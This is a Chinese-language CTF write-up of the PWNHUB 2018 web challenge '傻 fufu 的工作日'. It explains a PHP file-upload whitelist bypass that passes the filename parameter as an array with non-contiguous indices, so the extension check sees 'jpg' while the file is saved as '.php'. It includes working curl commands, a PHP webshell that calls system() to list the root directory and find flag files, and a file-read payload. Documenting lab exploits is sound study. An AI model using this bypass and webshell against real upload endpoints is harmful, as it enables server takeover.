---
title: PWNHUB 公开赛 2018 - Web - 傻 fufu 的工作日
date: 2026-11-14 18:20:00
categories:
  - CTF
  - PWNHUB 公开赛 2018
  - Web
tags:
  - 文件上传绕过
  - PHP数组传参
  - 后缀白名单差异
  - 一句话木马
cover: /img/cover/rainy-night-white-hair-girl.jpg
description: PWNHUB 公开赛 2018 Web 文件上传题，考察 PHP 数组传参绕过后缀白名单。上传点按点分割文件名校验，当参数传数组时跳过分割，利用计数与末尾取值差异让校验取到图片后缀、实际落盘为脚本，再写入木马读 flag。
keywords:
  - 傻fufu的工作日
  - 文件上传
  - PHP数组绕过
  - count与end
  - 一句话木马
ai: >-
  本题来自 PWNHUB 公开赛 2018，是一个只允许上传一张图片的文件上传点。源码经备份文件泄露但被加密，核心逻辑由公开题解与复现还原：后端同时用文件数组判断大小、用表单参数做后缀操作。漏洞在于当表单参数传入数组时会跳过按点分割，于是计数减一用于后缀白名单校验，而首元素当文件名、末元素当真实扩展名。攻击者构造非连续下标的数组，让校验读到合法图片后缀、落盘却是脚本文件，绕过只允许上传图片的限制。利用链为上传一句话木马、访问木马枚举根目录、定位答案文件后读取，最终得到脱敏后的 flag。加密源码不必硬解，重点是数组语义差异。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | PWNHUB 公开赛 2018 |
| 方向 | Web |
| 难度 | 源 wp 未标注（Unknown） |
| 环境 | 授权靶场（已脱敏） |
| 题目描述 | 一个文件上传功能，提示 `Allow One Image File`（只允许上传一张图片） |

## 信息收集

访问 `index.php.bak` 得到源码，但源码被 **phpjiami** 加密。无需硬解密，结合公开 writeup 与复现即可还原核心逻辑（见下）。

## 漏洞分析

核心逻辑（经 writeup 及复现确认）：

```php
$filename = !empty($_POST[$this->field]) ? $_POST[$this->field] : $_FILES[$this->field]['name'];
if(!is_array($filename)) {
    $filename = explode('.', $filename);
}
foreach ($filename as $name) {
    if(preg_match('#[<>:"/\\|?.]#is', $name)) {
        return $this->error('文件名中包含非法字符');
    }
}
if($_FILES[$this->field]['size'] > $this->allow_size) {
    return $this->error('你上传的文件太大');
}
if(!in_array($filename[count($filename)-1], $this->allow_ext)) {
    return $this->error('只允许上传图片文件');
}
// 用 . 分割文件名，只保留首尾两个字符串，防御 Apache 解析漏洞
$origin_name = current($filename);
$ext = end($filename);
$new_name = ($this->new_name ? $this->new_name : $origin_name) . '.' . $ext;
```

**PHP 数组差异绕过**的关键：

- `$_FILES` 用于判断「是否多文件上传」（判断 size）
- `$_POST['upfile']` 用于后缀名操作

当 `$_POST['upfile']` 传入**数组**时，`is_array($filename)` 为 `true`，**跳过 `explode('.', ...)`**。此时：

- `count($filename) - 1` 用于 `in_array()` 校验后缀（必须是图片后缀）
- `current($filename)`（第一个元素）作为文件名
- `end($filename)`（最后一个元素）作为真实扩展名

**绕过**：用非连续下标构造数组，让 `count-1` 指向的下标元素是合法图片后缀，而 `end()` 取到的是 `php`。提交 `upfile[1]=jpg`、`upfile[2]=php`：

- 数组为 `[1=>'jpg', 2=>'php']`，`count=2`
- `$filename[1]` = `jpg` → 通过 `in_array` 校验 ✅
- `current()` = `jpg`，`end()` = `php` → 最终文件名 `xxx.php`

## 利用过程

### 1. 上传 PHP 一句话木马

```bash
curl -F "upfile[1]=jpg" \
     -F "upfile[2]=php" \
     -F "upfile=@shell.txt;filename=a.txt" \
     "http://target:8080/"
```

`shell.txt` 内容（用于定位 flag 位置）：

```php
<?php echo "HELLO"; echo "\n"; system("ls -la /"); echo "\n---\n"; system("find / -name '*flag*' 2>/dev/null"); ?>
```

上传成功，响应返回 `<img src="upload/<hash>.php" alt="jpg">`，文件被保存为 `upload/xxx.php`（后缀 `php` 绕过成功）。

### 2. 访问木马读 flag

```bash
curl "http://target:8080/upload/<hash>.php"
```

发现 flag 文件在根目录 `/flag_xxxx`（实例相关哈希已脱敏）。

### 3. 读取 flag

```php
<?php echo file_get_contents("/flag_xxxx"); ?>
```

## 完整 EXP

> 同目录 `payload` 归档内容已并入本节。

```bash
# 1. 上传 PHP 木马（upfile[] 数组绕过后缀校验）
curl -F "upfile[1]=jpg" -F "upfile[2]=php" -F "upfile=@shell.txt;filename=a.txt" "http://target:8080/"
# 木马内容（定位 flag）：
# <?php echo "HELLO"; echo "\n"; system("ls -la /"); echo "\n---\n"; system("find / -name '*flag*' 2>/dev/null"); ?>

# 2. 访问上传的木马
curl "http://target:8080/upload/<hash>.php"

# 3. 读 flag（flag 位于根目录 /flag_xxxx，实例哈希已脱敏）
# <?php echo file_get_contents("/flag_xxxx"); ?>
```

```php
<?php echo file_get_contents("/flag_xxxx"); ?>
```

## Flag

`flag{xxxx}`（真实值已脱敏）。

## 踩坑与总结

- `$_POST` 传数组可绕过 `explode('.')` 的分割逻辑，这是整道题的入口。
- `count($array)-1` 与 `end($array)` 在「校验」和「实际取值」上的差异，是实现后缀绕过的关键；非连续下标让两者指向不同元素。
- phpjiami 加密源码不必硬解，搜索公开 writeup 获取核心逻辑即可，把精力放在 PHP 数组语义上。
- 上传成功后先枚举根目录再定向读 flag，避免在未知文件名上浪费时间。

> 仅记录授权靶场环境下的研究；完整 exp 见本地 WP 归档 `payload` 文件。
